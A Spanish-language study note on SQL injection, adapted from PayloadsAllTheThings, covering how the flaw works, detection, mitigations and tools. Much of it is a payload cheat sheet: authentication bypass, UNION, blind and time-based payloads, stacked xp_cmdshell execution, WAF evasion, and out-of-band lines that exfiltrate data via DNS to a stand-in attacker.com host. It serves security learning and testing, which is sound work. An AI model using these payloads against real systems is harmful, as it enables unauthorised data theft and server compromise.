---
tags:
  - seguridad-web
  - owasp
  - sqli
aliases:
  - SQLi
  - Inyección SQL
---

# Inyección SQL (SQLi)

**La inyección SQL** permite a un atacante interferir en las consultas que una aplicación lanza a su base de datos, inyectando SQL arbitrario. Es una de las vulnerabilidades web más comunes y graves: puede derivar en acceso y manipulación no autorizada de datos e incluso en el compromiso total del servidor.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?

Ocurre cuando la aplicación construye consultas SQL concatenando directamente la entrada del usuario sin sanearla. El atacante introduce caracteres que rompen el contexto de la consulta original y añaden lógica propia.

Ejemplo de autenticación vulnerable:

```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

Si en el campo usuario se inyecta `' OR '1'='1'--`, la consulta resultante siempre es verdadera y comenta el resto, saltándose la comprobación de contraseña:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```

El impacto va desde el robo de credenciales y datos sensibles hasta la escritura de archivos o la ejecución de comandos del sistema (RCE) según el SGBD y sus privilegios.

## Detección y pruebas

- **Mensajes de error**: introducir caracteres especiales para provocar errores SQL que revelen el punto de inyección.
  - Caracteres simples: `'`, `"`, `;`, `)`, `*`
  - Codificados: `%27`, `%22`, `%23`, `%3B`, `%29`, `%2A`
- **Tautologías** (siempre verdadero / siempre falso) para confirmar la inyección:

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

- **Ataques de tiempo**: usar funciones de retardo (`SLEEP`, `BENCHMARK`, `WAITFOR DELAY`); si la respuesta tarda, hay inyección.
- **Identificación del SGBD** mediante palabras clave o errores propios:

| SGBD | Payload de comprobación |
|---|---|
| MySQL | `connection_id()=connection_id()` |
| MSSQL | `@@CONNECTIONS=@@CONNECTIONS` |
| Oracle | `ROWNUM=ROWNUM` |
| PostgreSQL | `current_database()=current_database()` |
| SQLite | `sqlite_version()=sqlite_version()` |

## Explotación / payloads

### Bypass de autenticación

```sql
' OR '1'='1'--
' or 1=1 limit 1 --
```

> Cuidado con payloads "siempre verdadero" sobre endpoints destructivos (borrado de sesiones, archivos o datos). Usa `LIMIT` para acotar resultados.

### UNION-based

Combina la consulta original con un `SELECT` propio. Ambos `SELECT` deben tener el mismo número de columnas.

```sql
1' UNION SELECT username, password FROM users --
```

### Error-based

Fuerza errores cuyo mensaje filtra datos. Ejemplo en PostgreSQL (el `CAST` numérico falla y expone `version()`):

```sql
LIMIT CAST((SELECT version()) as numeric)
```

### Blind boolean-based

La aplicación responde distinto según la condición sea verdadera o falsa (tamaño de página, código HTTP). Se extrae carácter a carácter, idealmente por dicotomía:

```sql
1 AND 1=1 -- (respuesta normal)
1 AND 1=2 -- (respuesta distinta)
1 AND ASCII(SUBSTRING(@@hostname,1,1)) > 64 --
```

### Blind time-based

Cuando no hay diferencia visible en la respuesta, se infiere por el retardo:

```sql
' AND SLEEP(5)/*
'; WAITFOR DELAY '00:00:05' --
1 AND IF(SUBSTRING(VERSION(),1,1)='5', BENCHMARK(1000000,MD5(1)), 0) --
```

### Out-of-Band (OAST)

Exfiltración por canales alternativos (DNS) cuando no hay respuesta directa:

```sql
-- MySQL
LOAD_FILE('\\\\SUBDOMINIO.attacker.com\\a')
-- MSSQL
exec master..xp_dirtree '//SUBDOMINIO.attacker.com/a'
```

### Stacked queries

Varias sentencias separadas por `;` (no todos los SGBD lo permiten):

```sql
1; EXEC xp_cmdshell('whoami') --
```

### Second-order

El payload se almacena sin ejecutarse y se dispara después, al reutilizar ese dato en otra consulta no parametrizada.

### Bypass de WAF

- **Sin espacios**: `?id=1%09and%091=1%09--` (tab), comentarios `1/**/AND/**/1=1` o paréntesis `(1)and(1)=(1)`.
- **Sin comas**: `LIMIT 1 OFFSET 0`, `SUBSTR('SQL' FROM 1 FOR 1)`.
- **Sin `=`**: `LIKE`, `IN`, `BETWEEN` (`SUBSTRING(VERSION(),1,1)LIKE(5)`).
- **Operadores equivalentes**: `&&` por `AND`, `||` por `OR`, `HAVING` por `WHERE`; mayúsculas/minúsculas mixtas (`aNd`).

## Mitigación

- **Consultas parametrizadas / prepared statements** (la defensa principal): separa código de datos. Ojo: si se concatena entrada dentro del propio texto de la consulta preparada (p. ej. nombres de columna), sigue siendo vulnerable.
- **ORM y procedimientos almacenados** bien usados, sin construir SQL dinámico con entrada cruda.
- **Validación y allowlist** de la entrada (tipos, formatos, valores permitidos).
- **Principio de mínimo privilegio** en la cuenta de base de datos.
- **No mostrar errores SQL** al usuario; registrarlos internamente.
- **WAF** como capa adicional, nunca como única defensa.

## Herramientas

- **sqlmap** — detección y explotación automática de SQLi y toma de bases de datos.
- **ghauri** — detección y explotación multiplataforma de SQLi.

---
🔗 Relacionado: [[Inyección de comandos]] · [[XXE (XML External Entity)]] · [[Laboratorio DVWA (CTF)]] · [[Metasploit y Payload Reverse TCP]]
📚 Fuente: [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) (MIT, © Swissky)
